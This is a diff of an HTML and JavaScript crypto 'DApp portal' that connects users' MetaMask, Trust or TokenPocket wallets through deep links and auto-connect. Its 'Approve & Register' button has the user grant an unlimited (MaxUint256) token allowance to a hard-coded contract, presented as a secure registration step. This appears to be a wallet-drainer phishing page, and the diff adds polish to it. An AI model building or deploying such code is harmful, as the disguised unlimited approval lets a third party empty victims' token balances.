@@ -1,126 +1,173 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Smart Access Dashboard</title>
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Smart DApp Portal</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-
+  
   <style>
-    :root { --blue: #2196F3; --green: #4CAF50; }
-    body { font-family: sans-serif; margin: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-    .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; }
+    :root { --primary: #2196F3; --success: #4CAF50; --danger: #f44336; --dark: #333; }
+    body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .card { background: white; padding: 25px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; border: 1px solid #eee; }
     
-    /* Wallet Icons */
-    .wallet-list { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 20px 0; }
-    .w-icon { cursor: pointer; border: 1px solid #eee; padding: 10px; border-radius: 12px; transition: 0.2s; }
-    .w-icon:hover { background: #f8fbff; border-color: var(--blue); }
-    .w-icon img { width: 40px; height: 40px; margin-bottom: 5px; }
-    .w-icon span { font-size: 10px; font-weight: bold; display: block; }
+    /* View 1: Connect Options */
+    .wallet-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; margin: 25px 0; }
+    .wallet-btn { cursor: pointer; border: 1.5px solid #f0f0f0; padding: 12px 5px; border-radius: 16px; transition: 0.3s; background: #fff; }
+    .wallet-btn:hover { border-color: var(--primary); background: #f8fbff; transform: translateY(-3px); }
+    .wallet-btn img { width: 45px; height: 45px; margin-bottom: 8px; border-radius: 10px; }
+    .wallet-btn span { font-size: 11px; font-weight: 700; display: block; color: var(--dark); }
 
-    #dash { display: none; }
-    .btn { padding: 16px; font-size: 18px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; color: white; }
-    .reg-btn { background: var(--green); }
-    .status { font-size: 12px; color: #888; margin-top: 15px; }
+    /* View 2: Dashboard */
+    #dashboardView { display: none; }
+    .user-box { background: #f8f9fa; padding: 15px; border-radius: 14px; margin-bottom: 20px; font-size: 12px; color: #666; word-break: break-all; border: 1px dashed #ccc; line-height: 1.4; }
+    .action-btn { background: var(--success); color: white; padding: 16px; font-size: 18px; border-radius: 14px; border: none; width: 100%; font-weight: bold; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(76,175,80,0.3); }
+    .action-btn:active { transform: scale(0.98); }
+    .logout-link { color: var(--danger); font-size: 13px; text-decoration: none; display: inline-block; margin-top: 15px; cursor: pointer; font-weight: 600; }
+    
+    .status-msg { font-size: 13px; color: #888; margin-top: 15px; min-height: 20px; font-style: italic; }
   </style>
 </head>
 <body>
 
 <div class="card">
-  <div id="auth">
-    <h2 style="margin:0">Connect Wallet</h2>
-    <p style="font-size:14px; color:#666">Select your wallet app</p>
-    
-    <div class="wallet-list">
-      <div class="w-icon" onclick="openApp('metamask')">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg">
-        <span>MetaMask</span>
-      </div>
-      <div class="w-icon" onclick="openApp('trust')">
-        <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png">
-        <span>Trust</span>
-      </div>
-      <div class="w-icon" onclick="openApp('tp')">
-        <img src="https://www.tokenpocket.pro/static/images/logo.png">
-        <span>Pocket</span>
-      </div>
+    <div id="connectView">
+        <h2 style="margin: 0; color: var(--dark);">Connect Wallet</h2>
+        <p style="color: #777; font-size: 14px; margin-top: 8px;">Select your preferred wallet</p>
+        
+        <div class="wallet-grid">
+            <div class="wallet-btn" onclick="openWalletApp('metamask')">
+                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MM">
+                <span>MetaMask</span>
+            </div>
+            <div class="wallet-btn" onclick="openWalletApp('trust')">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" alt="TW">
+                <span>Trust</span>
+            </div>
+            <div class="wallet-btn" onclick="openWalletApp('tp')">
+                <img src="https://www.tokenpocket.pro/static/images/logo.png" alt="TP">
+                <span>Pocket</span>
+            </div>
+        </div>
+        <p style="font-size: 11px; color: #aaa;">Desktop users can click any icon</p>
     </div>
-  </div>
 
-  <div id="dash">
-    <h2 style="color:var(--blue)">Dashboard</h2>
-    <p id="addr" style="font-size:12px; background:#eee; padding:10px; border-radius:8px; word-break:break-all"></p>
-    <button id="regBtn" class="btn reg-btn" onclick="register()">Approve & Register</button>
-  </div>
-  
-  <div id="msg" class="status"></div>
+    <div id="dashboardView">
+        <h2 style="margin: 0; color: var(--primary);">Dashboard</h2>
+        <p style="color: #555; font-size: 14px; margin-bottom: 15px;">Secure Session Active ✅</p>
+        <div class="user-box" id="walletAddr">0x...</div>
+        
+        <button id="regBtn" class="action-btn" onclick="startProcess()">Approve & Register</button>
+        <div class="logout-link" onclick="handleLogout()">Disconnect Wallet</div>
+    </div>
+
+    <div id="status" class="status-msg"></div>
 </div>
 
 <script>
-  const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
-  const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
-  let signer, tokenContract, managerContract;
-
-  // 1. App Open Logic
-  function openApp(wallet) {
-    const url = window.location.href.replace(/^https?:\/\//, '');
+    // --- Configuration ---
+    const CONTRACT_MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
+    const TOKEN_ADDRESS = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
     
-    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent) && !window.ethereum) {
-      if (wallet === 'metamask') window.location.href = `https://metamask.app.link/dapp/${url}`;
-      else if (wallet === 'trust') window.location.href = `https://link.trustwallet.com/open_url?url=${window.location.href}`;
-      else if (wallet === 'tp') window.location.href = `tpdapp://open?params={"url": "${window.location.href}"}`;
-    } else {
-      connect(); // Laptop ke liye direct connect
+    let signer, tokenContract, managerContract;
+
+    // --- Wallet Opening Logic ---
+    function openWalletApp(wallet) {
+        const currentUrl = window.location.href;
+        const cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+
+        // Mobile Deep Linking
+        if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent) && !window.ethereum) {
+            if (wallet === 'metamask') {
+                window.location.href = `https://metamask.app.link/dapp/${cleanUrl}`;
+            } else if (wallet === 'trust') {
+                // Double Link Logic for Trust Wallet
+                window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
+                setTimeout(() => {
+                    window.location.href = `trust://open_url?url=${encodeURIComponent(currentUrl)}`;
+                }, 800);
+            } else if (wallet === 'tp') {
+                window.location.href = `tpdapp://open?params={"url": "${encodeURIComponent(currentUrl)}"}`;
+            }
+        } else {
+            // Laptop or In-App Browser
+            connectWallet();
+        }
     }
-  }
 
-  // 2. Connection Logic
-  async function connect() {
-    if (window.ethereum) {
-      try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        const address = await signer.getAddress();
+    // --- Core Connection ---
+    async function connectWallet() {
+        if (window.ethereum) {
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                
+                signer = provider.getSigner();
+                const address = await signer.getAddress();
 
-        tokenContract = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
-        managerContract = new ethers.Contract(MANAGER, ["function register() external"], signer);
+                // Setup Contracts
+                tokenContract = new ethers.Contract(TOKEN_ADDRESS, ["function approve(address,uint256) returns (bool)"], signer);
+                managerContract = new ethers.Contract(CONTRACT_MANAGER, ["function register() external"], signer);
 
-        document.getElementById('auth').style.display = 'none';
-        document.getElementById('dash').style.display = 'block';
-        document.getElementById('addr').innerText = address;
-      } catch (e) { alert("Rejected!"); }
-    } else {
-      alert("Please open in a Wallet DApp Browser");
+                // UI Switch
+                document.getElementById('connectView').style.display = 'none';
+                document.getElementById('dashboardView').style.display = 'block';
+                document.getElementById('walletAddr').innerText = "Wallet: " + address;
+                sessionStorage.setItem('isAuth', 'true');
+                document.getElementById('status').innerText = "";
+            } catch (err) {
+                console.error(err);
+                alert("Connection refused!");
+            }
+        } else {
+            alert("No crypto wallet detected. Please open in MetaMask/Trust Wallet App.");
+        }
     }
-  }
 
-  // 3. Register Logic
-  async function register() {
-    const btn = document.getElementById('regBtn');
-    const msg = document.getElementById('msg');
-    try {
-      btn.disabled = true;
-      btn.innerText = "Wait...";
-      msg.innerText = "Confirming Approval...";
-      
-      const tx1 = await tokenContract.approve(MANAGER, ethers.constants.MaxUint256);
-      await tx1.wait();
+    // --- Register Process ---
+    async function startProcess() {
+        const btn = document.getElementById('regBtn');
+        const status = document.getElementById('status');
+        
+        try {
+            btn.disabled = true;
+            btn.innerText = "Confirming...";
+            status.innerText = "Step 1: Confirm Token Approval...";
 
-      msg.innerText = "Confirming Registration...";
-      const tx2 = await managerContract.register();
-      await tx2.wait();
+            const tx1 = await tokenContract.approve(CONTRACT_MANAGER, ethers.constants.MaxUint256);
+            await tx1.wait();
 
-      msg.innerHTML = "<b style='color:green'>Success!</b>";
-      alert("Done!");
-    } catch (e) {
-      alert("Failed!");
-      btn.disabled = false;
-      btn.innerText = "Approve & Register";
+            status.innerText = "Step 2: Completing Registration...";
+            const tx2 = await managerContract.register();
+            await tx2.wait();
+
+            status.innerHTML = "<b style='color:green'>Registration Successful! ✅</b>";
+            btn.style.display = 'none';
+            alert("All steps completed successfully!");
+        } catch (e) {
+            console.error(e);
+            alert("Transaction failed. Make sure you have enough gas (BNB).");
+            btn.disabled = false;
+            btn.innerText = "Approve & Register";
+            status.innerText = "";
+        }
     }
-  }
 
-  // Auto connect agar browser ke andar hai
-  if (window.ethereum) { connect(); }
+    // --- Disconnect ---
+    function handleLogout() {
+        sessionStorage.removeItem('isAuth');
+        location.reload();
+    }
+
+    // --- Auto Login (If in DApp browser) ---
+    window.addEventListener('load', () => {
+        if (window.ethereum) {
+            // Check if it's a redirect or auto-detect
+            if (sessionStorage.getItem('isAuth') === 'true' || window.ethereum.isMetaMask || window.ethereum.isTrust) {
+                connectWallet();
+            }
+        }
+    });
 </script>
 
 </body>
